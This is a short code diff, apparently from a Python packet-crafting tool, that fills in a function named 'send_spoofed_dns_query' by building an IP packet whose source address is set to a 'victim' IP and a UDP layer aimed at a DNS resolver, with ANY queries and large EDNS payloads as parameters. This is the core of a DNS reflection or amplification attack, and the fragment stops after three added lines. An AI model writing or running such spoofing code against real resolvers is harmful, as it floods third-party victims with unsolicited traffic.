@@ -38,4 +38,6 @@ def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                            victim_src_port=53, qtype='ANY', edns_payload=4096,
                            dnssec_do=False, txid=0x1337, id_random=False,
                            verbose=False, measure=False, qclass=1):
-    pass
+    txid_val = _make_txid(txid, id_random)
+    ip_layer = IP(src=victim_ip, dst=resolver_ip)
+    udp_layer = UDP(sport=victim_src_port, dport=resolver_port)
